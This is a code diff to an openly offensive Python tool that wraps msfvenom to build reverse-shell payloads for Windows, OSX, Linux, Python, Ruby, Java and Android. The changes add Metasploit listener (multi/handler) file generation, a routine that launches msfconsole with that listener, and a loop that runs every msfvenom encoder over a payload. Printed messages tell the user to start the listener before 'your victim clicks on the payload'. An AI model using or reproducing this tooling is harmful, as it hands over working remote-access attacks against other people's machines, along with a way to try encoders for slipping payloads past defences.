@@ -4,6 +4,7 @@ import socket
 import operator
 from termcolor import colored
 import sys
+import time
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
 os.system('cat /root/ArmsCommander/banner_EZPZ.txt')
@@ -96,7 +97,25 @@ encoder_Dict = {
     '39': 'x86/unicode_upper'
 }
 
+def test_Encoder_Effectiveness():
 
+    payload_to_test = str(raw_input("Enter the payload you want to test: "))
+    iterations = str(raw_input("Enter the amount of iterations to encode: "))
+
+    for key in encoder_Dict:
+        bad_Bytes = "x00"
+        encoder_Set = encoder_Dict[key]
+        cmd_String = 'msfvenom -p {0} -e {1} -i {2} -b "\{3}" -o /rootArmsCommander/Encoder_Tested'.format(
+            payload_to_test,
+            encoder_Set,
+            iterations,
+            bad_Bytes
+        )
+        print colored(cmd_String,'red','on_white')
+        os.system(cmd_String)
+    print 'Encoder tests completed, please check console output'
+    main()
+    return
 def Windows_INLINE():
         opt_Dict = {
             '1': 'windows/meterpreter_reverse_tcp',
@@ -129,6 +148,31 @@ def Windows_INLINE():
             )
             print colored(cmd_String,'red','on_white')
             os.system(cmd_String)
+
+            # generate a handler file
+            print 'Creating handler directory and generating handler file'
+            os.system('mkdir /root/ArmsCommander/handler')
+            # handler_directory = '/root/ArmsCommander/handler/'
+            # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+            # handler_fullpath = handler_directory + handler_filename
+            handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+            # write proper parameters to handler file
+            print 'Writing to handler file'
+            handler.write('use multi/handler')
+            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+            # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+            handler.write("\nset PAYLOAD " + payload_Set)
+            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+            handler.write('\nset LHOST 0.0.0.0')
+            # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+            handler.write("\nset LPORT " + user_input.LPORT)
+            handler.write('\nset ExitOnSession false')
+            handler.write('\nexploit -j -z')
+
+            # Inform user where the handler file is stored
+            print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+            print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
         else:
             print colored('You have entered a invalid option','red','on_white')
             Windows_STAGED()
@@ -170,6 +214,31 @@ def Windows_STAGED():
             )
             print colored(cmd_String,'red','on_white')
             os.system(cmd_String)
+            # generate a handler file
+            print 'Creating handler directory and generating handler file'
+            os.system('mkdir /root/ArmsCommander/handler')
+            # handler_directory = '/root/ArmsCommander/handler/'
+            # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+            # handler_fullpath = handler_directory + handler_filename
+            handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+            # write proper parameters to handler file
+            print 'Writing to handler file'
+            handler.write('use multi/handler')
+            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+            # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+            handler.write("\nset PAYLOAD " + payload_Set)
+            # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+            handler.write('\nset LHOST 0.0.0.0')
+            # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+            handler.write("\nset LPORT " + user_input.LPORT)
+            handler.write('\nset ExitOnSession false')
+            handler.write('\nexploit -j -z')
+
+            # Inform user where the handler file is stored
+            print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+            print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
         else:
             print colored('You have entered a invalid option','red','on_white')
             Windows_STAGED()
@@ -234,6 +303,32 @@ def OSX_PPC():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         OSX_PPC()
@@ -273,6 +368,31 @@ def OSX_x86():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         OSX_x86()
@@ -335,6 +455,31 @@ def Linux_STAGED():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Linux_STAGED()
@@ -372,18 +517,51 @@ def Python_INLINE():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
+        # cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
+        #     payload_Set,
+        #     user_input.LHOST,
+        #     user_input.LPORT,
+        #     user_input.encoder,
+        #     user_input.encoder_iterations,
+        #     bad_Bytes,
+        #     user_input.output_format,
+        #     user_input.output_payload
+        # )
+
+        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
             payload_Set,
             user_input.LHOST,
             user_input.LPORT,
-            user_input.encoder,
-            user_input.encoder_iterations,
-            bad_Bytes,
             user_input.output_format,
             user_input.output_payload
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Python_INLINE()
@@ -411,18 +589,40 @@ def Python_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
+        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
             payload_Set,
             user_input.LHOST,
             user_input.LPORT,
-            user_input.encoder,
-            user_input.encoder_iterations,
-            bad_Bytes,
             user_input.output_format,
             user_input.output_payload
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Python_STAGED()
@@ -491,6 +691,31 @@ def Ruby_INLINE():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Ruby_INLINE()
@@ -539,6 +764,31 @@ def Java_STAGED():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Java_STAGED()
@@ -584,6 +834,31 @@ def Android_INLINE():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Android_INLINE()
@@ -622,6 +897,31 @@ def Android_STAGED():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        os.system('mkdir /root/ArmsCommander/handler')
+        # handler_directory = '/root/ArmsCommander/handler/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'w')
+
+        # write proper parameters to handler file
+        print 'Writing to handler file'
+        handler.write('use multi/handler')
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
+        handler.write("\nset PAYLOAD " + payload_Set)
+        # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
+        handler.write('\nset LHOST 0.0.0.0')
+        # handler.write("\nset LPORT {0}").format(user_input.LPORT)
+        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write('\nset ExitOnSession false')
+        handler.write('\nexploit -j -z')
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
+
     else:
         print colored('You have entered a invalid option','red','on_white')
         Android_STAGED()
@@ -648,6 +948,19 @@ def Platform_Android():
         print colored('You have entered a invalid option','red','on_white')
         Platform_Android()
     return
+
+def launch_msfconsole_handler():
+    print 'Launching Metasploit with premade handler'
+    print 'Make sure this handler is running BEFORE your victim clicks on the payload'
+    print 'Handler/Listener running, go send that payload!'
+    os.system('service postgresql start')
+    # os.system('service metasploit start') # Deprecated Command apparently
+    os.system('msfdb init')
+    os.system('msfdb start')
+    os.system('msfconsole -r /root/ArmsCommander/handler/EasyPeasey_payload_handler.rc')
+    os.system('db_status')
+    return
+
 def main():
     opt_List = [
         '\n\t#0. Return to Main Menu',
@@ -658,7 +971,9 @@ def main():
         '#5. Ruby Reverse Shells',
         '#6. Java Reverse Shells',
         '#7. Android Reverse Shells',
-        '#HELP. How to troubleshoot Reverse Shells in personal NATed networks'
+        '#8. Launch Metasploit Listener with your generated handler (Making a payload from #1 to 7 REQUIRED)',
+        '# HELP. How to troubleshoot Reverse Shells in personal NATed networks',
+        '# TEST ENCODERS. Specify a payload, and run all 39+ msfvenom encoders against it to determine whether or not it works'
     ]
 
     print ("\n\t".join(opt_List))
@@ -689,12 +1004,17 @@ def main():
         os.system('clear')
         Platform_Android()
         return
+    elif opt_Choice == "8":
+        os.system('clear')
+        launch_msfconsole_handler()
     elif opt_Choice == "HELP":
         os.system('clear')
         os.system('cat EZPZ_HowTo.txt')
         main()
     elif opt_Choice == "0":
         main()
+    elif opt_Choice == "TEST":
+        test_Encoder_Effectiveness()
     else:
         print colored('You have entered a invalid option','red','on_white')
         main()
